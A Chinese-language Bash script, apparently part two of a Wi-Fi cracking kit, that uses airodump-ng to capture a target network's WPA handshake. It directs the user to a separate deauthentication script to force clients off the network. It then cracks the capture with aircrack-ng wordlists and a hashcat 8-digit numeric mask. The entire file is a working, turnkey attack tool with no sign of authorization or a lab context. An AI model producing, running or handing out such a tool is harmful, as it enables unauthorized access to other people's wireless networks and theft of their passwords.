#!/bin/bash
# ============================================================
# 终端2: airodump-ng 锁定频道抓包
#
# 用法: sudo bash 2_capture.sh <BSSID> <频道>
# 例:   sudo bash 2_capture.sh A4:BA:70:04:1A:7E 9
#
# 作者: 传康Kk (微信:1837620622)
# ============================================================

# ---- 颜色 ----
R='\033[91m'; G='\033[92m'; Y='\033[93m'; C='\033[96m'; E='\033[0m'
info()  { echo -e "  ${C}[*]${E} $1"; }
ok()    { echo -e "  ${G}[✓]${E} $1"; }
warn()  { echo -e "  ${Y}[!]${E} $1"; }
err()   { echo -e "  ${R}[✗]${E} $1"; }

# ---- 检查参数 ----
[ "$(id -u)" -ne 0 ] && { err "需要 root: sudo bash 2_capture.sh <BSSID> <频道>"; exit 1; }

BSSID="$1"
CHANNEL="$2"

if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
    echo ""
    err "缺少参数！"
    echo ""
    echo "  用法: sudo bash 2_capture.sh <BSSID> <频道>"
    echo "  例:   sudo bash 2_capture.sh A4:BA:70:04:1A:7E 9"
    echo ""
    exit 1
fi

# ---- 获取监听接口 ----
MON=$(iw dev 2>/dev/null | awk '/Interface/{i=$2} /type monitor/{print i}')
if [ -z "$MON" ]; then
    err "未找到监听接口！请先运行: sudo bash 1_scan.sh"
    exit 1
fi

# ---- 创建结果目录 ----
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
RESULT_DIR="${SCRIPT_DIR}/结果/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$RESULT_DIR"
CAP_PREFIX="${RESULT_DIR}/handshake"

echo ""
echo -e "  ${C}╔════════════════════════════════════════════╗${E}"
echo -e "  ${C}║   终端2: 捕获握手包                       ║${E}"
echo -e "  ${C}╚════════════════════════════════════════════╝${E}"
echo ""
info "目标 BSSID: $BSSID"
info "频道: $CHANNEL"
info "接口: $MON"
info "保存到: $RESULT_DIR/"
echo ""
echo -e "  ${Y}右上角出现 ${G}WPA handshake: $BSSID${Y} 就说明抓到了！${E}"
echo -e "  ${Y}抓到后按 Ctrl+C 停止${E}"
echo ""
echo -e "  ${G}现在打开第3个终端运行:${E}"
echo -e "  ${G}sudo bash 3_deauth.sh $BSSID${E}"
echo ""

# ---- 开始捕获 ----
airodump-ng "$MON" --bssid "$BSSID" --channel "$CHANNEL" --write "$CAP_PREFIX"

# ---- Ctrl+C 后 ----
echo ""
echo -e "  ${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${E}"

# 查找捕获文件
CAP_FILE=$(ls -t "${CAP_PREFIX}"*.cap 2>/dev/null | head -1)
if [ -z "$CAP_FILE" ]; then
    err "未找到捕获文件"
    exit 1
fi

FSIZE=$(stat -c%s "$CAP_FILE" 2>/dev/null || stat -f%z "$CAP_FILE" 2>/dev/null)
ok "捕获文件: $CAP_FILE ($FSIZE 字节)"

# 检测握手包
echo ""
info "aircrack-ng 检测握手包..."
aircrack-ng "$CAP_FILE" 2>&1 | head -15
echo ""

# 询问是否破解
read -p "  是否开始破解? [Y/n] " answer
case "$answer" in
    [nN]*)
        info "稍后可运行: sudo aircrack-ng -w <字典> $CAP_FILE"
        ;;
    *)
        # 查找字典
        DICT_DIR="$(dirname "$SCRIPT_DIR")"
        WORDLIST=""
        for wl in \
            "${DICT_DIR}/wpa-sec-cracked.txt" \
            "${DICT_DIR}/wifi_dict.txt" \
            "/usr/share/wordlists/rockyou.txt" \
            "/usr/share/wordlists/fasttrack.txt"; do
            [ -f "$wl" ] && { WORDLIST="$wl"; break; }
        done

        # 解压 rockyou
        if [ ! -f "/usr/share/wordlists/rockyou.txt" ] && [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
            info "解压 rockyou.txt..."
            gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
            WORDLIST="/usr/share/wordlists/rockyou.txt"
        fi

        if [ -n "$WORDLIST" ]; then
            echo ""
            info "aircrack-ng 字典破解 ($(basename "$WORDLIST"))..."
            aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAP_FILE"
        else
            warn "未找到字典文件"
            info "手动: sudo aircrack-ng -w <字典文件> -b $BSSID $CAP_FILE"
        fi

        # hcxpcapngtool + hashcat 补充破解
        echo ""
        HASH_FILE="${RESULT_DIR}/hash.hc22000"
        if which hcxpcapngtool >/dev/null 2>&1; then
            info "hcxpcapngtool 转换..."
            hcxpcapngtool --all -o "$HASH_FILE" "$CAP_FILE" 2>&1 | grep -iE "EAPOL|PMKID|written|hash"

            if [ -s "$HASH_FILE" ]; then
                ok "Hash 提取成功!"
                info "hashcat 8位纯数字掩码..."
                hashcat -m 22000 -a 3 "$HASH_FILE" '?d?d?d?d?d?d?d?d' --potfile-disable --force 2>&1 | tail -10
            fi
        fi
        ;;
esac

echo ""
echo -e "  ${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${E}"
ok "完成! 结果目录: $RESULT_DIR"
echo -e "  ${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${E}"
